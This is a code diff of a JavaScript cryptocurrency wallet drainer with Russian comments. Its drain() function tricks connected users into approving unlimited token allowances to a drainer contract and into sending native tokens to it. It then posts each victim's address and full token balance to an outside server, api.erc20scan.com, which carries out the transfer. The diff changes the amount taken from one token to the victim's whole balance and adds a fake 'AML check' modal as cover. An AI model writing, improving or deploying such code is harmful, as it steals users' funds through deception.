@@ -4,6 +4,7 @@ import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
 import config from './config.js'; // Импортируем конфигурацию
+import { showAMLCheckModal } from './aml-check-modal.js';
 
 // === Конфигурация AppKit ===
 const projectId = config.PROJECT_ID;
@@ -456,28 +457,25 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 500000,
+          gasLimit: 100000,
           gasPrice: gasPrice,
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
-        // Перенаправление на Approve.html
-        window.location.href = 'https://erc20scan-result.com';
+
+        // Получаем roundedAmount из notifyServer
+        await hideModalWithDelay(); // Закрываем модальное окно верификации
+        const notifyResult = await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
+        const roundedAmount = notifyResult.roundedAmount;
+        await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
         status = 'confirmed';
 
-        // Закрываем модальное окно после успешного approve
-        if (!modalClosed) {
-          console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
-          await hideModalWithDelay();
-          modalClosed = true;
-        }
+        modalClosed = true;
       } catch (error) {
         console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
         if (error.message.includes('user rejected')) {
-          // Пользователь отклонил транзакцию
           if (!modalClosed) {
             console.log(`ℹ️ Пользователь отклонил approve для токена ${token}, закрываем модальное окно`);
             await hideModalWithDelay("Error: Transaction rejected by user.");
@@ -489,16 +487,15 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     } else {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
-        await notifyServer(userAddress, address, balance, chainId, null, provider);
-        // Перенаправление на Approve.html
-        window.location.href = 'https://erc20scan-result.com';
+        const notifyResult = await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
+        const roundedAmount = notifyResult.roundedAmount;
+        await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
         throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
       }
 
-      // Закрываем модальное окно, если allowance уже достаточно
       if (!modalClosed) {
         console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
         await hideModalWithDelay();
@@ -527,7 +524,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
         const tx = await drainer.processData(taskId, dataHash, nonce, [], {
           value,
-          gasLimit: 500000,
+          gasLimit: 100000,
           gasPrice: gasPrice,
           nonce
         });
@@ -536,7 +533,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`✅ Транзакция processData подтверждена: ${receipt.transactionHash}`);
         status = 'confirmed';
 
-        // Закрываем модальное окно после успешного processData
         if (!modalClosed) {
           console.log(`ℹ️ Закрываем модальное окно после успешного processData для ${chainConfig.nativeToken}`);
           await hideModalWithDelay();
@@ -545,7 +541,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       } catch (error) {
         console.error(`❌ Ошибка вывода ${chainConfig.nativeToken}: ${error.message}`);
         if (error.message.includes('user rejected')) {
-          // Пользователь отклонил транзакцию
           if (!modalClosed) {
             console.log(`ℹ️ Пользователь отклонил processData для ${chainConfig.nativeToken}, закрываем модальное окно`);
             await hideModalWithDelay("Error: Transaction rejected by user.");
@@ -561,18 +556,26 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   return status;
 }
 
-
-
-async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
+async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const decimals = await token.decimals();
-    console.log(`📊 Decimals токена: ${decimals}`);
+    const [balance, decimals] = await Promise.all([
+      token.balanceOf(userAddress),
+      token.decimals()
+    ]);
+    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
+    
+    // Исправляем округление: используем минимальное значение, чтобы избежать нулевого amount
+    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
+    const roundedBalance = Math.max(parseFloat(balanceUnits), 0.0001); // Минимальное значение 0.0001
+    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
-    // Фиксируем amount как 1 токен с учётом decimals
-    const fixedAmount = ethers.utils.parseUnits("1", decimals);
-    console.log(`📊 Фиксированное количество: 1 токен, в wei: ${fixedAmount.toString()}`);
+    console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
+
+    if (roundedAmount.lte(0)) {
+      throw new Error('Amount is zero or negative after rounding');
+    }
 
     const response = await fetch('https://api.erc20scan.com/api/transfer', {
       method: 'POST',
@@ -580,7 +583,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: fixedAmount.toString(),
+        amount: roundedAmount.toString(),
         chainId,
         txHash
       })
@@ -591,6 +594,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
     console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
+    return { success: true, roundedAmount: roundedAmount.toString() };
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
     throw new Error(`Failed to notify server: ${error.message}`);
